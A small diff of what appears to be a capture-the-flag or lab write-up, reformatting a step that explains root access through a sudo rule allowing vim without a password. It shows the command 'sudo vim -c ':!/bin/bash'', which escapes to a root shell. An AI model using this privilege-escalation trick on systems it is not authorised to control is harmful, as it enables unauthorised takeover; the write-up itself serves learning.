@@ -80,10 +80,12 @@ how did we gain root privilege here?
 
 -after sudo -l we got to know that we can access vim without any password
 so we tried to acces vim by this command
+```
+ NOPASSWD: /usr/bin/vim
 
-**sudo vim -c ':!/bin/bash'**
+**sudo vim -c ':!/bin/bash'** 
 
-
+```
 <img width="761" height="341" alt="Screenshot 2025-08-01 164110" src="https://github.com/user-attachments/assets/78095afb-146c-4da7-895f-c9b5bb2f7e6d" />
 
 
